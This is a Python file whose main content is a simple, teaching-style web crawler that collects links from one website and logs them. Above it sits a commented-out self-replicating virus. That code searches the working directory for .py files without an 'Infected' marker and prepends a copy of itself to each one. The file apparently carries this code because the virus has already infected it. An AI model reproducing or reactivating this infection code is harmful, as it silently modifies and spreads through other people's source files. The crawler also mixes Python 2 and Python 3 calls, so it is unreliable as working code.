#import os
#import inspect
#
#sigData = 'Infected'
#
#def search(path):
#    filesToInfect = []
#    fileList = os.listdir(path)
#    for fileName in fileList:
#        if os.path.isdir(path + os.path.sep + fileName):
#            filesToInfect.extend(search(path + os.path.sep + fileName))
#        elif fileName[-3:] == '.py':
#            infected = False
#            for line in open(path + os.path.sep + fileName):
#                if sigData in line:
#                    infected = True
#                    break
#            if infected == False:
#                filesToInfect.append(path + os.path.sep + fileName)
#    return filesToInfect
#
#def infect(filesToInfect):
#    targetFile = inspect.currentframe().f_code.co_filename
#    virus = open(os.path.abspath(targetFile))
#    virusString = ''
#    for i, line in enumerate(virus):
#        if i >= 0 and i < 41:
#            virusString = virusString + '#' + line
#    virus.close()
#    for fileName in filesToInfect:
#        f = open(fileName)
#        temp = f.read()
#        f.close()
#        f = open(fileName, 'w')
#        f.write(virusString + temp)
#        f.close()
#
#def explode():
#    pass
#
#infect(search(os.getcwd()))#
# install BeautifulSoup if not installed
#
import subprocess
import sys

try:
    # demonstrates: 3rd party library import
    from bs4 import BeautifulSoup
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "beautifulsoup4"])
    from bs4 import BeautifulSoup

#
# web crawler
#

# imports
import urllib

# declarations
url = "https://www.brummett.info/"
urls = []
urls2 = []
txt = open("crawl.txt", "w+")

# functions
def getPage(url):
    hrefs = []
    # demonstrates: try, except
    try:
        page = urllib.urlopen(url)
        soup = BeautifulSoup(page, "html.parser")
        for link in soup.find_all("a"):
            href = link.get("href")
            if(href):
                # demonstrates: substring                
                if (href[:4] != "http"):
                    if (href[0] =="/"):
                        href = url.rstrip("/") + href
                    elif (href[0] == "."):
                        href = url.rstrip("/") + href.lstrip(".")
                    elif (href[:4] == "mail" or href[:3] == "tel"):
                        href = "--> " + href
                    else:
                        href = "--* " + href
                # demonstrates: list methods
                hrefs.append(href)
    except:
        print("Error: " + url + " not found.")
        txt.write("Error: " + url + " not found.\n")
        hrefs.append("Error: Unable to crawl URL")
    return hrefs

print("Hyperlinks found in URL: " + url)
txt.write("Hyperlinks found in URL: " + url + "\n")

urls = getPage(url)

for item in urls:
    print(item)
    txt.write(item + "\n")
    if (item[:2] != "--"):
        urls2 = getPage(item)
        for item in urls2:
            print("    " + item)
            txt.write("    " + item + "\n")

txt.close()